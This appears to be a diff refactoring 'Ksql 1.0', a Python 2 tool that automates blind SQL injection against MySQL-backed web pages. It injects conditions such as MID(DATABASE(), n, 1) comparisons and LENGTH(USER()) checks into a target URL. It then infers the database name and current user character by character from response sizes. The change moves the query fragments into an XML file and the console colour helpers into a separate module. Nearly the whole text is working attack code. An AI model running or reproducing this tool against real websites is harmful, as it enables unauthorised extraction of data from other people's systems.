@@ -2,51 +2,20 @@
 # -*- coding:utf-8 -*-
 
 """
-	author:		kaysen - http://www.xujiantao.com
-	version:	Ksql 1.0
+author:		kaysen - http://www.xujiantao.com
+version:	Ksql 1.0
 """
 
 import sys, os, io, inspect, string, time, urllib, re, urlparse, difflib, chardet
-import filecmp, json, getopt, datetime, ctypes, threading, sqlite3, timeit
+import filecmp, json, datetime, threading, sqlite3, timeit, getopt
+import xml.etree.ElementTree as ET
+from core import stdout
 from difflib import *
 from time import ctime,sleep
 
 reload(sys)
 sys.setdefaultencoding('utf8')
-Timer = timeit.Timer()  
-
-def set_cmd_text_color(color, handle=ctypes.windll.kernel32.GetStdHandle(-11)):
-	Bool = ctypes.windll.kernel32.SetConsoleTextAttribute(handle, color)
-	return Bool
-
-
-def resetColor():
-	set_cmd_text_color(0x0f)
- 
-
-def printDarkGray(mess):
-	set_cmd_text_color(0x08)
-	sys.stdout.write(mess)
-	resetColor()
- 
-
-def printDarkGreen(mess):
-	set_cmd_text_color(0x02)
-	sys.stdout.write(mess)
-	resetColor()
-
-
-def printDarkYellow(mess):
-	set_cmd_text_color(0x06)
-	sys.stdout.write(mess)
-	resetColor()
- 
-
-
-def main(argv):
-	 for arg in argv:
-		print arg
-
+Timer = timeit.Timer()
 
 def modulePath():
 	try:
@@ -78,7 +47,13 @@ KSQL_ROOT_PATH   = modulePath()
 KSQL_XML_PATH    = os.path.join(KSQL_ROOT_PATH, 'xml')
 QUERIES_XML      = os.path.join(KSQL_XML_PATH, 'queries.xml')
 MAX_BLIND_COUNT  = 15
-ITOA64           = '0123456789@abcdefghijklmnopqrstuvwxyz'
+ITOA64           = '-0123456789@abcdefghijklmnopqrstuvwxyz_'
+DBMS             = 'mysql' # 暂时先只支持Mysql
+QueriesRoot      = ET.parse(KSQL_ROOT_PATH + '/xml/queries.xml').getroot()
+QueriesDBMS      = QueriesRoot.find(DBMS)
+
+def createBinarySql(url, type, num, midval):
+	return (url.replace('[[[ID]]]', '1" AND MID(%s, %d, 1)>"%s' % (QueriesDBMS.find(type).get('query'), num, midval)), url.replace('[[[ID]]]', '1" AND MID(%s, %d, 1)<"%s' % (QueriesDBMS.find(type).get('query'), num, midval)))
 
 
 sqlliteCon    = sqlite3.connect(':memory:', check_same_thread=False)
@@ -108,14 +83,12 @@ def run(type, tmpUrl, num, succPageSize, frontThread):
 		midval = ITOA64[mid]
 		
 		if type == '--current-db':
-			highSql = tmpUrl.replace('[[[ID]]]', '1" AND MID(DATABASE(), %d, 1)>"%s' % (num, midval))
-			lowSql  = tmpUrl.replace('[[[ID]]]', '1" AND MID(DATABASE(), %d, 1)<"%s' % (num, midval))
+			(highSql, lowSql) = createBinarySql(tmpUrl, 'current_db', num, midval)
 		elif type == '--current-user':
-			highSql = tmpUrl.replace('[[[ID]]]', '1" AND MID(USER(), %d, 1)>"%s' % (num, midval))
-			lowSql  = tmpUrl.replace('[[[ID]]]', '1" AND MID(USER(), %d, 1)<"%s' % (num, midval))
+			(highSql, lowSql) = createBinarySql(tmpUrl, 'current_user', num, midval)
 		
-		printDarkGray("[%s] [INFO] %s \r\n" %(now.strftime('%H:%M:%S'), highSql))
-		printDarkGray("[%s] [INFO] %s \r\n" %(now.strftime('%H:%M:%S'), lowSql))
+		stdout.printDarkGray("[%s] [INFO] %s \r\n" %(now.strftime('%H:%M:%S'), highSql))
+		stdout.printDarkGray("[%s] [INFO] %s \r\n" %(now.strftime('%H:%M:%S'), lowSql))
 
 		if len(htmlDecode(urllib.urlopen(lowSql).read())) == succPageSize:
 			high = mid - 1
@@ -125,7 +98,7 @@ def run(type, tmpUrl, num, succPageSize, frontThread):
 			sql = 'update info set value=value||"%s" where type="%s"' % (midval, type)
 			sqlliteCon.execute(sql)
 			sqlliteCon.commit()
-			printDarkGreen("[%s] [INFO] Hint %s \r\n" %(now.strftime('%H:%M:%S'), midval))
+			stdout.printDarkGreen("[%s] [INFO] Hint %s \r\n" %(now.strftime('%H:%M:%S'), midval))
 			break
 
 def manage(type, url):
@@ -148,9 +121,9 @@ def manage(type, url):
 
 		digitUrl = ''
 		if type == '--current-db':
-			digitUrl = tmpUrl.replace('[[[ID]]]', '1" AND LENGTH(DATABASE())="' + str(num))
+			digitUrl = tmpUrl.replace('[[[ID]]]', '1" AND LENGTH(' + QueriesDBMS.find('current_db').get('query') + ')="' + str(num))
 		elif type == '--current-user':
-			digitUrl = tmpUrl.replace('[[[ID]]]', '1" AND LENGTH(USER())="' + str(num))
+			digitUrl = tmpUrl.replace('[[[ID]]]', '1" AND LENGTH(' + QueriesDBMS.find('current_user').get('query') + ')="' + str(num))
 
 		if digitUrl != '' and len(htmlDecode(urllib.urlopen(digitUrl).read())) == succPageSize:
 			blindCount = num
@@ -173,9 +146,9 @@ def manage(type, url):
 	checkRes = cursor.fetchone()
 
 	if type == '--current-db':
-		printDarkYellow('Databse: ' + checkRes[0] + "\r\n")
+		stdout.printDarkYellow('Databse: ' + checkRes[0] + "\r\n")
 	elif type == '--current-user':
-		printDarkYellow('User: ' + checkRes[0] + "\r\n")
+		stdout.printDarkYellow('User: ' + checkRes[0] + "\r\n")
 
 
 def Usage():
@@ -233,7 +206,5 @@ def main(argv):
 if __name__ == '__main__':
 	main(sys.argv)
 	sqlliteCon.close()
-	
-	print Timer.timeit()
-	#printDarkYellow('Runtime: ' + runtime)
+	stdout.printDarkYellow('Runtime: ' + str(Timer.timeit()))
     
